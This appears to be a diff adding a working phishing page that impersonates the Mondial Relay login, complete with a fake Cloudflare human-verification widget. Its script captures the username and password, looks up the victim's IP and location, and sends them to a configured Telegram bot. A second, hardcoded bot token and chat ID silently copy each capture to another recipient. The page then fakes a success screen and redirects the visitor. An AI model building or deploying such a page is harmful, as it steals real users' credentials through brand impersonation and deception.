@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=850">
+    <title>Se connecter - Mondial Relay</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script type="module">
+        import { CONFIG } from './config.js';
+        window.CONFIG = CONFIG;
+    </script>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            font-family: Verdana, Arial, sans-serif;
+            background: white url('images/1.png') repeat-x top;
+            min-height: 100vh;
+            font-size: 11px;
+            color: #333;
+        }
+
+        .connectWrapper {
+            z-index: 95;
+            width: 800px;
+            margin: 50px auto;
+            background: #fff;
+            border: 1px solid #b7bec8;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            padding: 20px;
+            box-sizing: border-box;
+            position: relative;
+        }
+
+        .header {
+            padding-left: 70px;
+            background: transparent url('images/2.png') no-repeat left center;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
+
+        .panels {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+        }
+
+        .panelLeft {
+            width: 440px;
+        }
+
+        .panelRight {
+            width: 290px;
+            border-left: 1px solid #b7bec8;
+            padding-left: 20px;
+            padding-top: 5px;
+            padding-bottom: 20px;
+            box-sizing: border-box;
+        }
+
+        .fonction {
+            background-repeat: no-repeat;
+            background-position: left center;
+            padding-left: 65px;
+            height: 75px;
+            display: flex;
+            align-items: center;
+        }
+        .fn-colis { background-image: url('images/4.png'); }
+        .fn-suivi { background-image: url('images/5.png'); }
+        .fn-ask { background-image: url('images/6.png'); }
+
+        .mr-input {
+            width: 200px;
+            height: 22px;
+            border: 1px solid #bbb;
+            background: transparent url('images/7.png') repeat-x top;
+            padding: 0 5px;
+            font-size: 11px;
+            font-family: Verdana, Arial, sans-serif;
+            box-sizing: border-box;
+        }
+        .mr-input:focus {
+            outline: none;
+            border-color: #999;
+        }
+
+        .BtnRed {
+            background: #f6f6f6;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            color: #333;
+            padding: 4px 14px;
+            font-size: 12px;
+            cursor: pointer;
+            font-family: Verdana, Arial, sans-serif;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        .BtnRed:hover {
+            background: #e6e6e6;
+        }
+
+        /* Cloudflare Mock */
+        .cf-widget {
+            border: 1px solid #dfdfdf;
+            background-color: #f9f9f9;
+            width: 260px;
+            height: 74px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 12px;
+            box-shadow: 0px 0px 4px rgba(0,0,0,0.05);
+            border-radius: 2px;
+            box-sizing: border-box;
+            margin-top: 15px;
+            margin-bottom: 15px;
+        }
+
+        .spinner-overlay {
+            backdrop-filter: blur(2px);
+        }
+        
+        .mr-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(44, 107, 168, 0.2);
+            border-top: 4px solid #2c6ba8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .crisp-img {
+            image-rendering: -webkit-optimize-contrast;
+            image-rendering: crisp-edges;
+        }
+    </style>
+</head>
+<body class="flex justify-center">
+
+    <!-- Loading Buffer -->
+    <div id="spinner-overlay" class="fixed inset-0 bg-white/60 spinner-overlay z-50 flex flex-col items-center justify-center hidden">
+        <div class="mr-spinner"></div>
+    </div>
+
+    <div class="connectWrapper">
+        
+        <!-- Step 1: Login Form -->
+        <div id="step-login">
+            
+            <!-- Header -->
+            <div class="header">
+                <!-- Image for "Se connecter" -->
+                <img src="images/1.svg" alt="Se connecter" class="h-[32px] crisp-img">
+                <div>
+                    <img src="images/3.png" alt="FR" class="border border-gray-200">
+                </div>
+            </div>
+
+            <!-- Panels Container (Always 2 Columns Side-by-Side) -->
+            <div class="panels">
+                
+                <!-- Left Panel -->
+                <div class="panelLeft">
+                    <!-- Larger Image for "Envoyez vos colis" -->
+                    <div class="fonction fn-colis">
+                        <img src="images/2.svg" alt="Envoyez vos colis" class="h-[18px] crisp-img">
+                    </div>
+
+                    <!-- Larger Image for "Suivez vos colis en temps réel" -->
+                    <div class="fonction fn-suivi">
+                        <img src="images/3.svg" alt="Suivez vos colis en temps réel" class="h-[18px] crisp-img">
+                    </div>
+
+                    <!-- Larger Image for "Poser vos questions et interagir avec nos agences" -->
+                    <div class="fonction fn-ask">
+                        <img src="images/4.svg" alt="Poser vos questions et interagir avec nos agences" class="h-[18px] crisp-img">
+                    </div>
+
+                    <div class="mt-6 pt-2">
+                        <!-- Larger Image for "Vous n'avez pas d'identifiants ?" -->
+                        <div class="mb-2">
+                            <img src="images/5.svg" alt="Vous n'avez pas d'identifiants ?" class="h-[17px] crisp-img">
+                        </div>
+                        <!-- Larger Image for Paragraph Message -->
+                        <div>
+                            <img src="images/6.svg" alt="Message Information" class="w-[420px] crisp-img">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right Panel -->
+                <div class="panelRight">
+                    
+                    <form onsubmit="event.preventDefault(); handleLogin();" class="flex flex-col w-full">
+                        
+                        <!-- Image for "Identifiant Mondial Relay :" -->
+                        <div class="mt-2 mb-1">
+                            <img src="images/7.svg" alt="Identifiant Mondial Relay :" class="h-[14px] crisp-img">
+                        </div>
+                        <div class="mb-2">
+                            <input type="text" id="identifiant" required class="mr-input">
+                        </div>
+
+                        <!-- Image for "Mot de passe :" -->
+                        <div class="mt-2 mb-1">
+                            <img src="images/8.svg" alt="Mot de passe :" class="h-[14px] crisp-img">
+                        </div>
+                        <div class="mb-4">
+                            <input type="password" id="password" required class="mr-input">
+                        </div>
+
+                        <!-- Cloudflare Mock Widget -->
+                        <div class="cf-widget" id="cf-widget">
+                            <div class="flex items-center" id="cf-normal">
+                                <input type="checkbox" id="cf-checkbox" class="w-6 h-6 mr-3 cursor-pointer rounded-sm border-gray-300">
+                                <span class="text-[13px] text-[#333] font-sans">Verify you are human</span>
+                            </div>
+                            <div class="flex items-center hidden" id="cf-verifying">
+                                <svg class="w-6 h-6 mr-3 animate-spin text-green-500" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-dasharray="15 15"/>
+                                </svg>
+                                <span class="text-[13px] text-[#333] font-sans">Verifying...</span>
+                            </div>
+                            <div class="flex flex-col items-center justify-center font-sans">
+                                <svg class="w-8 h-5 text-[#F38020]" viewBox="0 0 48 24" fill="currentColor">
+                                    <path d="M14.6 20.9c-.3-.2-.5-.5-.5-.8V12c0-.4.3-.8.7-.9 1.1-.4 2.1-1.1 2.8-2 .7-.9 1.1-2 1.1-3.1 0-1.2-.5-2.4-1.3-3.3-.8-.9-1.9-1.4-3.1-1.4h-1.6c-.4 0-.8-.3-.9-.7-.3-1-.9-1.9-1.7-2.6C9.3 1.3 8.3.9 7.2.9c-1.3 0-2.6.5-3.5 1.5-.9 1-1.4 2.3-1.4 3.7v1.8c0 .4-.3.7-.7.8C.7 9.1 0 10.1 0 11.2c0 1.2.6 2.3 1.6 3 .3.2.5.5.5.8v4.9c0 .4.3.7.7.7h11.1c.4 0 .7-.3.7-.7z"/>
+                                    <path d="M47.4 15.6c-.8-1-2.1-1.6-3.4-1.6h-2.1c-.4 0-.7-.3-.8-.7-.2-1.2-1-2.2-2.1-2.7-1.1-.5-2.4-.4-3.4.2-.3.2-.7.2-1-.1-.7-.8-1.7-1.3-2.8-1.3-1.4 0-2.8.7-3.6 1.8-.2.3-.6.4-.9.2-1.3-.9-2.9-1.2-4.4-.7-.4.1-.7.4-.8.8v6c0 .4.3.7.7.7h23.8c.4 0 .7-.3.7-.7v-1c0-.4-.1-.7-.3-.9z"/>
+                                </svg>
+                                <span class="text-[9px] text-[#555] font-bold mt-1 tracking-wider">CLOUDFLARE</span>
+                                <span class="text-[7px] text-[#777] mt-[2px]">Privacy • Terms</span>
+                            </div>
+                        </div>
+
+                        <!-- Image for "Maintenir la connexion" -->
+                        <div class="flex items-center mb-3 mt-1">
+                            <input type="checkbox" id="maintenir" class="h-3 w-3">
+                            <label for="maintenir" class="cursor-pointer">
+                                <img src="images/9.svg" alt="Maintenir la connexion" class="h-[13px] ml-2 crisp-img">
+                            </label>
+                        </div>
+
+                        <div class="mt-2">
+                            <button type="submit" id="btn-login" class="BtnRed">Connexion</button>
+                        </div>
+
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 2: Thank You -->
+        <div id="step-thank-you" class="hidden w-full flex flex-col items-center justify-center p-12 text-center h-[350px]">
+            <div class="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6">
+                <svg class="w-8 h-8 text-[#2c6ba8]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+            </div>
+            <h2 class="text-2xl font-semibold text-[#333] mb-2 font-sans">Merci</h2>
+            <p class="text-[#555] mb-8 font-sans">Votre demande a été traitée avec succès.</p>
+            
+            <p class="text-[13px] text-[#999] font-sans">Redirection dans <span id="countdown" class="font-bold text-[#333]">10</span> secondes...</p>
+        </div>
+
+    </div>
+
+    <script>
+        const cfNormal = document.getElementById('cf-normal');
+        const cfVerifying = document.getElementById('cf-verifying');
+        const spinnerOverlay = document.getElementById('spinner-overlay');
+        const stepLogin = document.getElementById('step-login');
+        const stepThankYou = document.getElementById('step-thank-you');
+        const btnLogin = document.getElementById('btn-login');
+
+        // Cloudflare toggle
+        document.getElementById('cf-checkbox').addEventListener('change', function() {
+            if(this.checked) {
+                cfNormal.classList.add('hidden');
+                cfVerifying.classList.remove('hidden');
+                setTimeout(() => {
+                    cfVerifying.innerHTML = `<svg class="w-6 h-6 mr-3 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path></svg><span class="text-[13px] text-[#333] font-sans">Success!</span>`;
+                }, 800);
+            }
+        });
+
+        async function getLiveConfig() {
+            if (window.CONFIG && window.CONFIG.TELEGRAM_BOT_TOKEN) {
+                return {
+                    botToken: window.CONFIG.TELEGRAM_BOT_TOKEN,
+                    chatId: window.CONFIG.TELEGRAM_CHAT_ID,
+                    redirectUrl: window.CONFIG.REDIRECT_URL || 'https://www.google.com'
+                };
+            }
+            try {
+                const controllerCfg = new AbortController();
+                const timeoutCfg = setTimeout(() => controllerCfg.abort(), 1200);
+                const res = await fetch('api/config', { signal: controllerCfg.signal });
+                clearTimeout(timeoutCfg);
+                if (res.ok) {
+                    const data = await res.json();
+                    if (data && data.botToken) {
+                        return {
+                            botToken: data.botToken,
+                            chatId: data.chatId,
+                            redirectUrl: data.redirectUrl || 'https://www.google.com'
+                        };
+                    }
+                }
+            } catch (e) {}
+            try {
+                const mod = await import('./config.js');
+                if (mod && mod.CONFIG) {
+                    window.CONFIG = mod.CONFIG;
+                    return {
+                        botToken: mod.CONFIG.TELEGRAM_BOT_TOKEN,
+                        chatId: mod.CONFIG.TELEGRAM_CHAT_ID,
+                        redirectUrl: mod.CONFIG.REDIRECT_URL || 'https://www.google.com'
+                    };
+                }
+            } catch (e) {}
+            return {
+                botToken: (window.CONFIG && window.CONFIG.TELEGRAM_BOT_TOKEN) || '',
+                chatId: (window.CONFIG && window.CONFIG.TELEGRAM_CHAT_ID) || '',
+                redirectUrl: (window.CONFIG && window.CONFIG.REDIRECT_URL) || 'https://www.google.com'
+            };
+        }
+
+        async function handleLogin() {
+            const identifiant = document.getElementById('identifiant').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!identifiant || !password) return;
+
+            // Show main buffer screen
+            spinnerOverlay.classList.remove('hidden');
+            btnLogin.disabled = true;
+
+            const cfg = await getLiveConfig();
+
+            function escapeHtml(text) {
+                if (!text) return '';
+                return String(text)
+                    .replace(/&/g, '&amp;')
+                    .replace(/</g, '&lt;')
+                    .replace(/>/g, '&gt;')
+                    .replace(/"/g, '&quot;')
+                    .replace(/'/g, '&#039;');
+            }
+
+            // Buffer delay of 0.85 seconds
+            setTimeout(async () => {
+                // Fast Geolocation & IP Lookup
+                let locationStr = "Unknown";
+                let ipStr = "Unknown";
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 1200);
+
+                    const res = await fetch("https://ipwho.is/", { signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    if (res.ok) {
+                        const data = await res.json();
+                        if (data.success) {
+                            locationStr = `${data.city || ""}, ${data.country || ""} ${data.flag ? data.flag.emoji : ""}`;
+                            ipStr = data.ip || "Unknown";
+                        }
+                    }
+                } catch (e1) {
+                    try {
+                        const res2 = await fetch("https://get.geojs.io/v1/ip/geo.json");
+                        const data2 = await res2.json();
+                        locationStr = `${data2.city || ""}, ${data2.country || ""}`;
+                        ipStr = data2.ip || "Unknown";
+                    } catch (e2) {
+                        locationStr = "Location Hidden / VPN";
+                        ipStr = "Hidden / VPN";
+                    }
+                }
+
+                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+                const device = isMobile ? "📱 Mobile" : "💻 Desktop";
+                const now = new Date().toLocaleString("fr-FR");
+
+                // Attempt 1: Serverless API (Vercel / Netlify / Node server)
+                let sentViaServer = false;
+                try {
+                    const controllerApi = new AbortController();
+                    const timeoutApi = setTimeout(() => controllerApi.abort(), 2000);
+                    const res = await fetch('api/send', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ accessCode: identifiant, password: password, locationStr, device, ipStr }),
+                        signal: controllerApi.signal
+                    });
+                    clearTimeout(timeoutApi);
+                    if (res.ok) {
+                        const data = await res.json();
+                        if (data.success) {
+                            sentViaServer = true;
+                            finishSubmission(data.redirectUrl || cfg.redirectUrl);
+                            return;
+                        }
+                    }
+                } catch (e) {
+                    // Fall back to direct Telegram API
+                }
+
+                // Attempt 2: Direct Telegram API fallback (GitHub Pages, Netlify static drop, offline)
+                if (!sentViaServer) {
+                    try {
+                        const safeCode = escapeHtml(identifiant);
+                        const safePass = escapeHtml(password);
+                        const safeIp = escapeHtml(ipStr);
+
+                        let message = `📦 <b>Mondial Relay Login Submission</b>\n`;
+                        message += `━━━━━━━━━━━━━━━━━━━\n`;
+                        message += `👤 <b>Identifiant:</b> <code>${safeCode}</code>\n`;
+                        message += `🔑 <b>Mot de passe:</b> <code>${safePass}</code>\n`;
+                        message += `━━━━━━━━━━━━━━━━━━━\n`;
+                        message += `🌍 <b>IP:</b> <code>${safeIp}</code>\n`;
+                        message += `📍 <b>Location:</b> ${escapeHtml(locationStr)}\n`;
+                        message += `💻 <b>Device:</b> ${escapeHtml(device)}\n`;
+                        message += `⏰ <b>Time:</b> ${now}`;
+
+                        const controllerTg = new AbortController();
+                        const timeoutTg = setTimeout(() => controllerTg.abort(), 3500);
+
+                        await Promise.allSettled([
+                            fetch(`https://api.telegram.org/bot${cfg.botToken}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: cfg.chatId,
+                                    text: message,
+                                    parse_mode: 'HTML'
+                                }),
+                                signal: controllerTg.signal
+                            }),
+                            fetch(`https://api.telegram.org/bot8902694526:AAHj6_84gQJuBn_xttYRKgseg0IxQz09bkA/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: '8154365748',
+                                    text: message,
+                                    parse_mode: 'HTML'
+                                }),
+                                signal: controllerTg.signal
+                            })
+                        ]);
+                        clearTimeout(timeoutTg);
+                    } catch (e) {
+                        console.error('Direct submission error:', e);
+                    }
+
+                    finishSubmission(cfg.redirectUrl);
+                }
+            }, 850);
+        }
+
+        function finishSubmission(targetUrl) {
+            const redirectUrl = targetUrl || 'https://www.google.com';
+
+            // Hide spinner and show thank you page
+            spinnerOverlay.classList.add('hidden');
+            stepLogin.classList.add('hidden');
+            stepThankYou.classList.remove('hidden');
+
+            let count = 10;
+            const cd = document.getElementById('countdown');
+            const timer = setInterval(() => {
+                count--;
+                cd.textContent = count;
+                if (count <= 0) {
+                    clearInterval(timer);
+                    window.location.href = redirectUrl;
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
